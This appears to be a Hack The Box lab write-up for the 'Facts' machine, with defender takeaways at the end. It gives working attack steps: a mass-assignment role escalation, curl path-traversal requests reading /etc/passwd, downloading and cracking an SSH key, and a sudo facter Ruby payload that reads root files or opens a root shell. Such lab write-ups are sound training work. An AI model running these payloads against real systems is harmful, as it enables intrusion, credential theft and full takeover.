# HTB — Facts Writeup

**Difficulty:** Easy | **OS:** Linux | **IP:** 10.129.47.108

---

## Attack Chain Overview

```
Register account → CVE-2025-2304 (mass assignment → admin role)
→ Extract MinIO S3 credentials from admin panel
→ CVE-2026-1776 (path traversal → user flag)
→ Enumerate MinIO internal bucket → SSH private key
→ Crack passphrase (john + rockyou) → SSH as trivia
→ sudo facter --custom-dir (arbitrary Ruby as root) → root flag
```

---

## Reconnaissance

### Why we do this
Before touching anything, we need to know what's running. Nmap performs TCP SYN scanning (`-sS`) with service/version detection (`-sV`) and default scripts (`-sC`). Without this step we would have missed port 54321 entirely — which is the key to the whole box.

### Initial scan (quick)

```bash
nmap -sSCV -oN nmap -T4 facts.htb
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu
80/tcp open  http    nginx 1.26.3 (Ubuntu)
```

This quick scan only shows the top 1000 ports. Port 54321 is above that range, so a full port scan is required.

### Full port scan (via ReconX `--web` mode)

```bash
reconx facts.htb --web
```

The full scan reveals the critical third service:

```
PORT      STATE SERVICE
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu
80/tcp    open  http    nginx 1.26.3 (Ubuntu)
54321/tcp open  http    MinIO (Golang net/http server)
```

**Why port 54321 matters:** The nmap fingerprint shows `Server: MinIO` in the HTTP headers and the title redirects to `http://facts.htb:9001` — the MinIO web console. MinIO is an S3-compatible object storage server. This tells us the web application is likely using it as a file/media backend, and S3 backends often contain sensitive data.

---

## Enumeration

### Web Application — Port 80

Navigating to `http://facts.htb` shows a trivia website built on **Camaleon CMS v2.9.0** — a Ruby on Rails-based CMS. The version is visible in the admin panel after logging in.

**Why identify the CMS version?** Known CVEs are version-specific. Camaleon CMS 2.9.0 has multiple public vulnerabilities. Identifying the exact version immediately narrows the attack surface.

### Directory Enumeration

ReconX runs ffuf automatically. Key findings:

```
/admin        → 302 (redirects to /admin/login)
/admin/register → account registration page
/robots.txt   → exists
/sitemap.xml  → exists
/captcha      → image captcha endpoint
```

**Why enumerate directories?** The `/admin` path is not linked from the homepage. Without fuzzing, we would only see the public trivia site and miss the entire CMS attack surface.

### Technology Fingerprinting

WhatWeb and Nuclei confirm:
- nginx 1.26.3 on Ubuntu
- Ruby on Rails application (Camaleon CMS)
- AWS S3 / MinIO storage backend (Nuclei detects `Detect Amazon-S3 Bucket`)
- CORS misconfiguration
- Missing security headers

Nuclei also specifically flags: `Camaleon CMS Login - Panel` — confirming the CMS identity without manual inspection.

---

## Exploitation

### Step 1 — Register an Account

Navigate to `http://facts.htb/admin/register` and create an account. The registration form has an image captcha that must be solved manually in the browser.

**Why register?** CVE-2025-2304 is a *post-authentication* vulnerability — you need to be logged in first. The registration is open to anyone, so this is a zero-barrier entry point.

After registering, the account has the `client` role — minimal privileges, no access to settings or media management.

---

### Step 2 — CVE-2025-2304: Mass Assignment → Admin Role

**What is mass assignment?**
In Ruby on Rails, model attributes can be set in bulk from request parameters. If the developer fails to whitelist which parameters are allowed (using Strong Parameters), an attacker can inject additional fields — like `role` — that should never be user-controlled.

**The vulnerable endpoint:**
The "Change Password" functionality sends a PATCH request to:
```
POST /admin/users/<your_id>/updated_ajax
```

The normal request body looks like:
```
_method=patch&authenticity_token=...&password[password]=newpass&password[password_confirmation]=newpass
```

By appending `&password[role]=admin`, the Rails backend processes the role update alongside the password change because the AJAX endpoint doesn't strictly whitelist the allowed parameters.

**Why this works:** The UI disables the role dropdown (`disabled="disabled"`), but this is purely a client-side restriction. The server doesn't validate that role changes are forbidden in this context.

**Automated with the public exploit:**

```bash
python3 exploit.py -u http://facts.htb -U test123 -P test -e -r
```

```
[+] Login confirmed — User ID: 5, Role: client
[+] Updated User Role: admin
[+] Extracting S3 Credentials:
    Access Key: AKIA633F05CB6D247114
    Secret Key: 4MrEvoW+xX6T7Y/ifjprY37gOqQ480JjpMt6r1Bf
    Endpoint:   http://localhost:54321
[+] Reverting User Role: client
```

The exploit also extracts the MinIO credentials from the admin settings panel (Settings → Configuration → Filesystem) and optionally reverts the role to avoid detection.

**Note:** The credentials extracted by the exploit differ from those shown in the writeup blog post — the machine generates unique credentials per instance. Always use the credentials from your own exploit run.

---

### Step 3 — CVE-2026-1776: Path Traversal via S3 Backend

**What is this vulnerability?**
The `download_private_file` endpoint in Camaleon CMS's media controller takes a `file` parameter and passes it to the S3 backend without sanitization. When S3 storage is active, the path is resolved relative to the bucket root — but `../` sequences are not stripped, allowing traversal outside the intended directory.

**Why S3 must be active:** The vulnerability is only triggered when the S3/MinIO backend is configured. On a local filesystem backend, the path handling is different. The presence of MinIO on port 54321 is what enables this.

**Reading arbitrary files:**

```bash
# Confirm the vulnerability
curl "http://facts.htb/admin/media/download_private_file?file=../../../etc/passwd" \
  -b "_factsapp=YOUR_COOKIE; auth_token=YOUR_TOKEN"
```

From `/etc/passwd`, two interesting users are identified:
```
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```

**Grabbing the user flag directly:**

```bash
curl "http://facts.htb/admin/media/download_private_file?file=../../../home/william/user.txt" \
  -b "_factsapp=YOUR_COOKIE; auth_token=YOUR_TOKEN"
```

```
USER FLAG: 4eae3c9235315498728ea32eaf329d27
```

**Why william and not trivia?** The user flag is in william's home directory. The `trivia` user is the one we'll SSH into later — they are different accounts with different purposes on this machine.

---

## MinIO Enumeration

### Why enumerate MinIO?
The S3 endpoint is exposed externally on port 54321. With valid credentials (extracted from the CMS), we can interact with it directly using the AWS CLI — the same tool used for real AWS S3. MinIO is API-compatible with S3, so the same commands work.

### Configure AWS CLI profile

```bash
aws configure set aws_access_key_id AKIA633F05CB6D247114 --profile facts
aws configure set aws_secret_access_key "4MrEvoW+xX6T7Y/ifjprY37gOqQ480JjpMt6r1Bf" --profile facts
aws configure set region us-east-1 --profile facts
```

**Why a named profile?** Using `--profile facts` keeps these credentials isolated from any real AWS credentials on the system. It also makes commands reproducible.

### List buckets

```bash
aws --endpoint-url http://facts.htb:54321 s3 ls --profile facts
```

```
2025-09-11  internal
2025-09-11  randomfacts
```

Two buckets: `randomfacts` (the public trivia images) and `internal` — the suspicious one.

### Enumerate the internal bucket

```bash
aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/ --recursive --profile facts
```

The `internal` bucket contains a full home directory backup — including `.ssh/`:

```
2026-04-25 17:25:59   464B  .ssh/id_ed25519
2026-04-25 17:25:59    82B  .ssh/authorized_keys
```

**Why is this significant?** Someone backed up a user's home directory to S3 and left their SSH private key in it. This is a common real-world mistake — developers back up home directories to cloud storage without considering that SSH keys are sensitive credentials.

### Download the private key

```bash
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519 --profile facts
chmod 600 ./id_ed25519
```

**Why `chmod 600`?** SSH refuses to use a private key if it's world-readable. The permissions must be restricted to the owner only, or SSH will reject it with a "bad permissions" error.

---

## Cracking the SSH Key Passphrase

The private key is encrypted with a passphrase. Attempting to SSH with it prompts for the passphrase — we don't know it yet.

### Why use ssh2john + john?

`ssh2john` converts the SSH private key into a hash format that John the Ripper can process. John then performs a dictionary attack against that hash using rockyou.txt — a wordlist of ~14 million real-world passwords leaked from the RockYou breach.

```bash
ssh2john id_ed25519 > id_ed25519.hash
john id_ed25519.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
dragonballz      (/tmp/id_ed25519)
Session completed.
```

**Why rockyou.txt?** It's the most commonly used wordlist for CTFs and real engagements because it contains passwords people actually use. The passphrase `dragonballz` is a pop culture reference — exactly the kind of weak passphrase rockyou covers.

---

## Initial Access — SSH as trivia

```bash
ssh -i id_ed25519 trivia@facts.htb
# Enter passphrase: dragonballz
```

**Why trivia and not william?** The SSH key was found in the `internal` bucket which is a backup of the `trivia` user's home directory (confirmed by the `.ssh/authorized_keys` matching). William's account holds the user flag but doesn't have SSH access configured.

We're now in as `trivia`.

---

## Privilege Escalation

### Enumeration

The first thing to check after getting a shell is what the current user can run with elevated privileges:

```bash
sudo -l
```

```
(ALL) NOPASSWD: /usr/bin/facter
```

**Why check sudo -l first?** It's the fastest path to root if misconfigured. `NOPASSWD` means we can run this binary as root without knowing the root password. `(ALL)` means we can run it as any user, including root.

### What is facter?

Facter is a system inventory tool used by Puppet (a configuration management system) to collect "facts" about a host — OS version, IP addresses, CPU info, etc. It is written in Ruby and supports **custom facts** defined in Ruby scripts.

The key feature: `facter --custom-dir=/path/to/dir` loads all `.rb` files from the specified directory and executes them as Ruby code to define new facts.

**Why this is dangerous as sudo:** Since facter runs as root, any Ruby code it executes inherits root privileges. This is equivalent to `sudo ruby` — full arbitrary code execution as root.

### Crafting the exploit

Create a malicious Ruby fact file:

```bash
echo 'Facter.add(:pwn) { setcode { `cat /root/root.txt` } }' > /tmp/pwn.rb
```

**Breaking down the Ruby syntax:**
- `Facter.add(:pwn)` — registers a new fact named `pwn`
- `setcode do ... end` — defines the Ruby block that runs when the fact is evaluated
- Backticks execute a shell command and return its output as the fact's value

### Execute as root

```bash
sudo /usr/bin/facter --custom-dir=/tmp pwn
```

```
d77cfe6f7c94b764278ee08bcdc10ee2
```

**ROOT FLAG: `d77cfe6f7c94b764278ee08bcdc10ee2`**

### For an interactive root shell

```bash
echo 'Facter.add(:pwn) { setcode { exec("/bin/bash -p") } }' > /tmp/pwn.rb
sudo /usr/bin/facter --custom-dir=/tmp pwn
```

`exec()` in Ruby replaces the current process with `/bin/bash -p`. The `-p` flag preserves the effective UID (root), giving a full root shell.

---

## Flags

| Flag | Value |
|------|-------|
| User | `4eae3c9235315498728ea32eaf329d27` |
| Root | `d77cfe6f7c94b764278ee08bcdc10ee2` |

---

## Tools Used

| Tool | Purpose | Why this tool |
|------|---------|---------------|
| nmap | Port scanning & service detection | Industry standard; `-sC` scripts auto-detect services |
| ReconX | Full recon automation | Runs nmap, httpx, ffuf, nuclei, whatweb in sequence |
| ffuf | Directory/endpoint fuzzing | Fast, flexible, supports auto-calibration to reduce false positives |
| nuclei | Vulnerability scanning | Template-based; detected Camaleon CMS login panel and S3 buckets automatically |
| AWS CLI | S3/MinIO interaction | API-compatible with MinIO; same tool used for real AWS |
| ssh2john | SSH key → hash conversion | Required to make the key crackable by John |
| john | Password/passphrase cracking | Dictionary attack against the SSH key hash |
| expect | SSH automation with passphrase | Handles interactive prompts in non-interactive sessions |

---

## Vulnerability Summary

| CVE | Type | Impact |
|-----|------|--------|
| CVE-2025-2304 | Mass Assignment (IDOR) | Escalate any user to admin role |
| CVE-2026-1776 | Path Traversal (S3 backend) | Read arbitrary files as web user |
| sudo facter misconfiguration | Insecure sudo rule | Arbitrary code execution as root |

---

## Key Takeaways

**For defenders:**
1. **Strong Parameters in Rails** — every controller action that accepts user input must explicitly whitelist allowed attributes. The AJAX password endpoint should never accept a `role` parameter.
2. **Never store SSH keys in S3 buckets** — even "internal" buckets. Use IAM roles for service-to-service authentication instead of long-lived access keys.
3. **S3 path sanitization** — any endpoint that accepts a file path and proxies it to S3 must strip `../` sequences and validate the resolved path stays within the intended prefix.
4. **Sudo hygiene** — granting `NOPASSWD` sudo to any tool that can execute arbitrary code (Ruby, Python, Perl, facter, etc.) is equivalent to granting a root shell. Audit sudo rules regularly.

**For attackers (CTF context):**
- Always run a full port scan (`-p-`), not just the top 1000. Port 54321 would have been missed otherwise.
- When you find a CMS, identify the exact version immediately and search for CVEs.
- S3/MinIO buckets are goldmines — always enumerate all buckets and their contents when you have credentials.
- `sudo -l` is the first thing to run after getting a shell.
